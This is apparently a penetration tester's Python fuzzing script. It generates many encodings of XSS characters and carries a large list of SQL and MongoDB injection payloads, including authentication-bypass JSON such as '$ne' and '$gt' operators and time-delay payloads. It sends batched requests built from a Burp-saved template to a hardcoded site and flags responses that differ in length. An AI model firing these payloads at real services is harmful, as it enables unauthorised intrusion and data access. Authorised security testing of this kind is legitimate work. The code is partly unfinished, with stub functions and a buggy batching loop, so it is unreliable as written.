#!/usr/bin/env python3

import requests
import string
from itertools import combinations
from html import escape 
from urllib.parse import urlencode, quote_plus
import asyncio
import time


DEBUG = True

def html_encode_key(chars: str) -> str:
    """ HTML Encode key html characters to entities like &quot; """

    return escape(chars)

def html_encode_dec(chars: str, zeros=0) -> str:
    """ HTML Encode ALL html characters to decimal entities like &#60;&#61; """

    return "".join(f'&#{str(ord(x)).zfill(zeros)};' for x in chars)

def html_encode_hex(chars: str, zeros=0) -> str:
    """ HTML Encode ALL html characters to hex entities like &#3c;&#3d; """

    return "".join(f'&#x{hex(ord(x))[2:].zfill(zeros)};' for x in chars)

def url_encode(chars: str) -> str:
    """ URL Encode ALL characters, like %3d """

    return urlencode({"1":chars}, quote_via=quote_plus)[2:]

def utf16_encode(chars: str, zeros=4, seperator="") -> str:
    """ Convert all chars to utf-16 \ u 0 0 0 n format """

    return "".join(f'\\u{hex(ord(u))[2:].zfill(zeros)}{seperator}' for u in chars)

def utf32_encode(chars: str) -> str:
    """ Convert ALL chars to \ u f f \ u f e utf-32 format (unsure this actually exists, but.. whatever, we're hackers) """
    
    return str(chars.encode("utf-32"))[2:-1].replace("x", "u")

def hex_encode_utf32(chars: str) -> str:
    """ Convert ALL chars to \xff\xfe\x00\x00 utf-32 format """

    return str(chars.encode("utf-32"))[2:-1]

def hex_encode(chars: str, zeros=0, separator="") -> str:
    """ Convert ALL chars to \x03d format with optional separator"""

    return "".join(f'\\x{hex(ord(c))[2:].zfill(zeros)}{separator}' for c in chars)

def mix_case(chars: str) -> str:
    """ Create exactly one casing variation: <script> -> <sCrIpT> """
    
    char_list = [c for c in chars]
    for c in range(0, len(char_list)):
        if c % 2:
            char_list[c] = char_list[c].upper()
        else:
            char_list[c] = char_list[c].lower()
    return "".join(char_list)

def escape_quotes(chars: str) -> str:
    """ Change this: <img onerror="alert()"> to this: <img onerror=\"alert()\"> """

    chars = chars.replace('"', '\\"')
    chars = chars.replace("'", "\\'")
    chars = chars.replace("´", "\´")
    chars = chars.replace("`", "\`")
    return chars

def change_double_quotes(chars: str) -> list:
    """ Replace double quotes with several single quotes """

    quot = []
    quot.append(chars.replace('"', "'"))
    quot.append(chars.replace('"', "´"))
    quot.append(chars.replace('"', "`"))
    return quot

def change_quotes(chars: str) -> str:
    """ Create varitions in quotes, doublequotes -> backticks, single-quotes -> forward-tick """

    chars = chars.replace("'", "´")
    chars = chars.replace('"', "`")
    return chars

def encode_all_formats(base: str) -> list:
    chars = []

    # Formats
    chars.append(base)

    # - double-quote to single-quote variants
    chars += change_double_quotes(base)

    # - quotes to ticks
    chars.append(change_quotes(base))

    # - escaped quotes
    chars.append(escape_quotes(base))
    [chars.append(escape_quotes(v)) for v in change_double_quotes(base)]
    chars.append(escape_quotes(change_quotes(base)))

    # - url-encoded
    chars.append(url_encode(base))
    
    # - html-entity-encoded
    chars.append(html_encode_key(base))

    for i in range(7):
        # - html-decimal-encoded
        chars.append(html_encode_dec(base, zeros=i))

        # - html-hex-encoded
        chars.append(html_encode_hex(base, zeros=i))

        # - \u utf16
        chars.append(utf16_encode(base, zeros=i))

        # - \x
        chars.append(hex_encode(base, zeros=i))

    # - \u utf32
    chars.append(utf32_encode(base))

    # - \x
    chars.append(hex_encode_utf32(base))

    # - Casing
    for c in chars.copy():
        chars.append(c.upper())
        chars.append(mix_case(c))

    return chars

def get_XSS_chars() -> list:
    # Chars
    base = "<>=?()-;'\""

    return encode_all_formats(base)

def load_headers(filename: str, base_url: str):
    """ Load request type, headers and body data from file (save with Burp!) """

    headers = {}
    data = ""
    url = base_url
    typ = "GET"

    with open(filename) as f:
        # Read first line for request type and url path component
        line = f.readline().strip()
        typ = line.split(" ")[0]
        url += line.split(" ")[1]
        
        read_headers = True
        for line in f.readlines():
            # Switch state, stop reading headers
            # start reading data instead        
            if line == "\n":
                read_headers = False

            if read_headers:
                try:
                    key = line.strip().split(":", 1)[0]
                    value = line.split(":", 1)[1].strip()
                    headers[key] = value
                except:
                    pass
            else:
                try:
                    data += line
                except:
                    pass
    return typ, url, headers, data

async def threaded_request(typ: str, url: str, headers: dict, data: dict, proxy=False):
    """ Make asyncronous requests of several types, optional proxy to Burp """
    
    proxies = None
    if proxy:
        if "https" in url:
            proxies = { "https" : "https://localhost:8080" }
        else:
            proxies = { "http" : "http://localhost:8080" }
    
    try:
        if typ == "GET":
            return await asyncio.to_thread(requests.get, url, headers=headers, data=data, proxies=proxies, verify=False)
        
        if typ == "POST":
            return await asyncio.to_thread(requests.post, url, headers=headers, data=data, proxies=proxies,verify=False)

        # Add more types as needed, PUT, OPTION, ...
    except:
        pass

def get_special_chars() -> str:
    """ Return string of all printable special chars without """
    """ backslash, cause it's a troublemaker!                """

    return string.printable.replace("\\", "").replace(string.digits, "").replace(string.ascii_lowercase, "").replace(string.ascii_uppercase, "")

def get_combos(chars: str, count=2) -> list:
    return ["".join(a) for a in combinations(chars, count)]

def get_SQL_chars() -> list:
    """ Basic SQL character tests (all flavours) - if these are filtered, """ 
    """ inc. encoded / escaped, we can give up                            """
    base_list = ["'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\" , "\\\\", ";", "' or \"", "-- or #", "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -", "' OR '' = '", "'='", "'LIKE'", "'=0--+", " OR 1=1", "' OR 'x'='x", "' AND id IS NULL; --", "'''''''''''''UNION SELECT '2", "%00", "/*…*/", "+		addition, concatenate (or space in url)", "||		(double pipe) concatenate", "%		wildcard attribute indicator", "@variable	local variable", "@@variable", "$", "$eq:", "AND 1", "AND 0", "AND true", "AND false", "1-false", "1-true", "1*56", "-2", "true, $where: '1 == 1'", ", $where: '1 == 1'", "$where: '1 == 1'", "', $where: '1 == 1", "1, $where: '1 == 1'", "\{ $ne: 1 \}", "', $or: [ \{\}, \{ 'a':'a", "' \} ], $comment:'successful MongoDB injection'", "db.injection.insert(\{success:1\});", "db.injection.insert(\{success:1\});return 1;db.stores.mapReduce(function() \{ \{ emit(1,1", "|| 1==1", "|| 1==1//", "|| 1==1%00", "\}, \{ password : /.*/ \}", "' && this.password.match(/.*/)//+%00", "' && this.passwordzz.match(/.*/)//+%00", "'%20%26%26%20this.password.match(/.*/)//+%00", "'%20%26%26%20this.passwordzz.match(/.*/)//+%00", "\{$gt: ''\}", "[$ne]=1", "';sleep(5000);", "';it=new%20Date();do\{pt=new%20Date();\}while(pt-it<5000);", "\{\"username\": \{\"$ne\": null\}, \"password\": \{\"$ne\": null\}\}", "\{\"username\": \{\"$ne\": \"foo\"\}, \"password\": \{\"$ne\": \"bar\"\}\}", "\{\"username\": \{\"$gt\": undefined\}, \"password\": \{\"$gt\": undefined\}\}", "\{\"username\": \{\"$gt\":\"\"\}, \"password\": \{\"$gt\":\"\"\}\}", "\{\"username\":\{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]\},\"password\":\{\"$gt\":\"\"\}\}"]

    sql = []
    for base in base_list:
        sql += encode_all_formats(base)
    
    return sql

def screen_update(text: str) -> None:
    """ TODO: Consider making pretty output to easily recognize findings """
    # - Add little ASCII art header
    # - Use sys.stdout.buffer.write to write TEMPORARILY to screen, e.g. elapsed items 15/500
    # - Add keyboard toggles, show Info-Line like: [U]rl [R]esponse-Text [S]tatus-Code ...

def refresh_cookies():
    """ TODO: Contemplate GENERIC method to initially get / refresh cookies """
    # - Find way to distinguish successful request from failed request bit later
    # - Consider Session Vars and Browser Cache / Local Storage etc.

async def main() -> int:
    """ Load request type, headers and body data from file (save with Burp!) """
    typ, url, headers, data_raw = load_headers("search_header.txt", "https://network-sec.de")
    print(url)
    
    # Generate list of combinations
    # comb = get_combos(get_special_chars(), 2)

    data = data_raw.strip()

    with open("xss_wordlist.txt") as f:
        lines = f.readlines()
        
        while len(lines):
            # Measure, how long it takes, to control rate
            stamp = time.time()

            # Pack bundle of 20 items and delay requests between bundles
            send_lines = []
            for l in range(20):
                if len(lines):
                    send_lines.append(lines[l])
                    lines.pop(l)
                else:
                    continue

            # Run requests async
            responses = await asyncio.gather(*[threaded_request(typ, url, headers, html_encode_key(data.replace("FUZZ", i))) for i in send_lines])
                
            ref_len = 0
            for response in responses:
                # skip empty / failed requests
                if not response:
                    continue

                # TODO: Implement various conditions to choose from:
                # - length (manual / automatic)
                # - needle / search
                # - status code
                # - etc
                if not ref_len:
                    ref_len = len(response.text)
                    continue

                if len(response.text) != ref_len:
                    print("[+]", len(response.text))
                    print(response.status_code)
                    print(response.text.split("\n"))
                
                if DEBUG:
                    print("[+]", len(response.text))
                    print(response.request.url)
                    print(response.request.headers)
                    print(response.request.body)
                    print(response.status_code)
                    print(response.text.split("\n"))
            
            elapsed = time.time() - stamp
            if 1 > elapsed > 0:
                time.sleep(1 - elapsed)
    return 0

if __name__ == "__main__":
    # pprint.pp(get_SQL_chars())
    asyncio.run(main())
